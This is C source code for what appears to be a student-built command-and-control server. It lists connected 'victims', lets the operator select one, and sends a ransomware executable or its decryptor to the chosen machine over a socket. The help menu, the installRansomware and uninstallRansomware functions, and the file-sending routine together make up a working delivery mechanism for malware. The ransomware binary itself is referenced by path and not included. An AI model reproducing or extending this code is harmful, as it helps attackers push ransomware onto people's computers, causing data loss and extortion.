#include <Windows.h>
#include <stdio.h>

#define RANSOMWARE_FILE_PATH "C:\\Users\\magshimim\\Desktop\\CProjets\\ShellVirus\\ransomwareFile\\ransomware.exe"
#define RANSOMWARE_FIXER_FILE_PATH "C:\\Users\\magshimim\\Desktop\\CProjets\\ShellVirus\\ransomwareFile\\ransomwareFixer.exe"
#define BUFFER_SIZE 1024
#define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits

// Functions
void displayHelp();
void installRansomware(int victimSocket);
void uninstallRansomware(int victimSocket);
void send_file(char *filePath, int socket);

void displayHelp()
{
    /* 
    Prints help menu
    */

    printf("%s%s%s%s%s%s%s",
    "\n\thelp - this command\n",
    "\n\t-- Before selecting victim --\n",
    "\tvictims - prints how much victim's connected\n",
    "\tselect [index] - selects the victim's object from [connectedVictims] on [index] to apply commands to it\n\n",
    "\t-- After selecting victim\n",
    "\transom - installs a ransomware on his pc\n",
    "\tfix ransom - uninstall the ransomware from his pc\n"
    );
}

void installRansomware(int victimSocket)
{
    /*
    Installs the ransomware on the victim's pc

    param 1: the victim socket
    */

    int command;

    printf("Installing...\n");

    // Sends the command
    command = 0;
    command = htonl(command);
    send(victimSocket, (char *)&command, sizeof(command), 0);

    // Sends the anydesk file
    send_file(RANSOMWARE_FILE_PATH, victimSocket);

    printf("The Installing has been successfully completed!\n");
}

void uninstallRansomware(int victimSocket)
{
    /*
    Uninstalls the ransomware from the victim's pc

    param 1: the victim socket
    */

    int command;

    printf("Installing the ransomware fixer file...\n");

    // Sends the command
    command = 1;
    command = htonl(command);
    send(victimSocket, (char *)&command, sizeof(command), 0);

    // Sends the anydesk file
    send_file(RANSOMWARE_FIXER_FILE_PATH, victimSocket);

    printf("The ransomware fixer file has been successfully completed!\n");
    printf("Start decrypting files...\n");
}

void send_file(char *filePath, int socket)
{
    FILE *fp;
    char buffer[BUFFER_SIZE] = {0};
    int fileSize, sentBytesAmount, totalRead = 0, readBytes;

    fp = fopen(filePath, "rb");
    if (fp == NULL)
    {
        printf("Error in file reading!");
        exit(1);
    }

    // Gets the file size
    fseek(fp, 0, SEEK_END);
    fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET); // Seeks to the beginning of the file

    printf("FileSize is %d bytes\n", fileSize);

    // Sends file size
    fileSize = htonl(fileSize); // Converts to big endian
    send(socket, (char *)&fileSize, sizeof(fileSize), 0);

    // Sends the file
    while (totalRead < ntohl(fileSize))
    {
        readBytes = fread(buffer, sizeof(char), sizeof(buffer), fp);
        sentBytesAmount = send(socket, buffer, readBytes, 0);
        if (sentBytesAmount == SOCKET_ERROR)
        {
            printf("Error in file sending! (%d)", GetLastError());
            exit(1);
        }

        totalRead += readBytes;
        printf("sent: %d/%d (%d bytes sent right now)\n", totalRead, ntohl(fileSize), sentBytesAmount);
    }

    fclose(fp);

    printf("File has successfully sent!\n");
}